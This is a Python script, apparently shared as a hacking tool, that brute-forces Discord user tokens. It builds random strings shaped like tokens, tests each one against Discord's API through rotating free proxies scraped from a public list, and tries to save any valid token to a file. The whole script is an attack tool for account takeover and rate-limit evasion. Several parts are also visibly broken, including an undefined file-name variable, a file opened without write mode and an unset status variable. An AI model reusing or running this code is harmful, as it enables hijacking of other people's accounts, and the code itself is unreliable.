import random
import string
import os
import requests
from itertools import cycle
import base64
from random import randint
from lxml.html import fromstring
import requests
import traceback
from colorama import init, Fore as cc
from os import system, name
from time import sleep

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

banner = f'''
{w}███{b}╗{w}   ███{b}╗{w}██{b}╗{w}   ██{b}╗{w}████████{b}╗{w}██{b}╗{w}  ██{b}╗{w}██{b}╗{w} ██████{b}╗{w} █████{b}╗{w} ██{b}╗{w}     
████{b}╗{w} ████{b}║{w}{b}╚{w}██{b}╗{w} ██{b}╔{w}{b}╝{w}{b}╚{w}{b}═{w}{b}═{w}██{b}╔{w}{b}═{w}{b}═{w}{b}╝{w}██{b}║{w}  ██{b}║{w}██{b}║{w}██{b}╔{w}{b}═{w}{b}═{w}{b}═{w}{b}═{w}{b}╝{w}██{b}╔{w}{b}═{w}{b}═{w}██{b}╗{w}██{b}║{w}     
██{b}╔{w}████{b}╔{w}██{b}║{w} {b}╚{w}████{b}╔{w}{b}╝{w}    ██{b}║{w}   ███████{b}║{w}██{b}║{w}██{b}║{w}     ███████{b}║{w}██{b}║{w}     
██{b}║{w}{b}╚{w}██{b}╔{w}{b}╝{w}██{b}║{w}  {b}╚{w}██{b}╔{w}{b}╝{w}     ██{b}║{w}   ██{b}╔{w}{b}═{w}{b}═{w}██{b}║{w}██{b}║{w}██{b}║{w}     ██{b}╔{w}{b}═{w}{b}═{w}██{b}║{w}██{b}║{w}     
██{b}║{w} {b}╚{w}{b}═{w}{b}╝{w} ██{b}║{w}   ██{b}║{w}      ██{b}║{w}   ██{b}║{w}  ██{b}║{w}██{b}║{w}{b}╚{w}██████{b}╗{w}██{b}║{w}  ██{b}║{w}███████{b}╗{w}
{b}╚═╝     ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝{w}
                                                                
{m}Made by: sxvn#1337  {w}                                                              '''
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"
count = 0
def clear():
  
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')

clear()

def get_proxies():
    url = 'https://sslproxies.org/' 
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

print(banner)

while True:
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        
        tokens.append(token)
    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    
    
    for token in tokens:
        proxy = next(proxy_pool)
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        r = requests.get(url, headers=header, proxies={"http": proxy})
        if r.status_code == 200:
            lmao = u"\u001b[32;1m[+] Valid Token\u001b[0m"
            f = open(current_path+"/"+tokens.txt)
            f.write(token+"\n")
        elif "rate limited." in r.text:
            lmao = "\u001b[-] You are being rate limited\u001b[0m"
        else:
            status = u"\u001b[31m[-] Invalid:\u001b[0m"
        
        print(status + " " + token)
        count = count + 1
        if count == 4:
            sleep(0.2)
            clear()
            print(banner)
            count = 0
        tokens.remove(token)
